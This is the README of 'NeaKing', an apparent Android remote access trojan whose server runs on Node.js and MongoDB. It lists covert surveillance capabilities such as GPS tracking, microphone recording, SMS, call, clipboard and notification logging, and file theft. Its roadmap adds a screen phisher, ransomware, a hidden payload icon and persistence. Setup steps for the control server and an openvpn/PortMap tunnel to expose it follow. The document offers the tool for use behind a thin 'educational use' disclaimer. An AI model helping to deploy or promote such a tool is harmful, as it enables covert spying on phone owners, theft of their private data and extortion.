<p align="center">
A cloud based remote android management suite, powered by NodeJS,Express and MongoDb
</p>



## Features
- [x] Move database to Mongo DB
- [x] Move to Kotlin
- [x] GPS Logging
- [x]  Microphone Recording
- [x]  View Contacts
- [x]  SMS Logs
- [x]  Send SMS
- [x] Call Logs
- [x] View Installed Apps
- [x] View Stub Permissions
- [x] Live Clipboard Logging
- [x] Live Notification Logging
- [x] View WiFi Networks (logs previously seen)
- [x] File Explorer & Downloader
- [x] Command Queuing

## Features to be implemented
- Register Users So that it is not only one User
- Built In APK Builder
- Build ReactJs Front End
- Anti-Delete
- Screen Control
- Format Phone (device admin request is present) Only implementing
- Phone Call
- Screen Phisher
- Dump System Info
- Live Webcam Stream
- Uninstall App
- Lock/Unlock Screen (device admin request is present) Only implementing
- Run Shell Command
- Webcam Snap
- Open App
- Install App
- Device Info
- Hide/Show payload app icon (Make work on version 11,12,13) Available in below
- Fastest Screen Control
- Call Forwarder
- Anti  Delete
- Lock Screen ( Screen On But cannot Touch )
- Ransomware (device admin request is present) Only implementing
- Freeze Phone
- Change Wallpaper (device admin request is present) Only implementing
- Persistent In Background

## Prerequisites 
 - Java Runtime Environment 11
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server

## Installation 
1. Install JRE 11 (We cannot stress this enough USE java 11 ANY issues that dont use this will be closed WITHOUT a response)
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-11-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-11-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/java/technologies/downloads/) for downloads

2. Install NodeJS [Instructions Here](https://www.digitalocean.com/community/tutorials/how-to-install-node-js-on-ubuntu-20-04) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`

4. Releases coming soon

5. In the extracted folder, run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run L3MON on startup

6. Set a Username & Password
    1. Stop NeaKing `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
        - very  soon we are going to move user registration Using reactjs
    4. save the file
    5. run `pm2 restart all`

7. in your browser navigate to `http://<SERVER IP>:22533`
    
It's recommended to run NeaKing behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/) or 
- Debian, Ubuntu, Etc
  - `sudo apt install openvpn`
  use [PortMap](https://portmap.io) for configuration and this [youtube Video ](https://www.youtube.com/watch?v=wXA_C0ymh0A) for instruction to get key
  - `sudo openvpn --config /path/to/openvpnconfingFile.ovpn  &`

## Notes
When opening an issue, you **MUST** use the provided templates. Issues without this will not receive support quickly and will be put to the bottom of the figurative pile.

Please have a look through the current issues, open and closed to see if your issue has been addressed before. If it's java related, it's most definitely been addressed - In short Use Java 1.8.0

## Screenshots
Coming Soon
## Thanks
Neaking Builds off and utilizes server opensource software's, Without these, Neaking Wouldn't be what it is!
 - Inspiration for the project and the basic building blocks for the Android App are based off [AhMyth](https://github.com/AhMyth/AhMyth-Android-RAT) 
 - [express](https://github.com/expressjs/express)
 - [node-geoip](https://github.com/bluesmoon/node-geoip)
 - [lowdb](https://github.com/typicode/lowdb)
 - [socket.io](https://github.com/socketio/socket.io)
 - [Open Street Map](https://www.openstreetmap.org)
 - [Leaflet](https://leafletjs.com/)
 - [mongo](https://mongodb.com/)
 - [L3MON](https://github.com/D3VL/L3MON)
 - [Rafel Rat](https://github.com/swagkarna/Rafel-Rat.git)

# donate to  us
- $5 $10, $15, $20 $50 $500
- bitcoin: bc1qthcek3k95hauc6ssx0h8e533juq9aszsztlgfj
- ETH ETH:  0xBbde3bE748CaEB04801d9C728fdFeC418c6Eaf6E
- USDT: TDo3yMbQDgeikvwwVJNeprx2jeyScyadsA

## Support

For support, Signal +254702707676,or @yunatamos just everywhere

## Disclaimer
<b>YUNAT AMOS Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
NEAKING is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made with ❤️ By <a href="//github.com/yunatamos/">Yunat Amos</a></p>
<p align="center" style="font-size: 8px">v1.0.0</p>
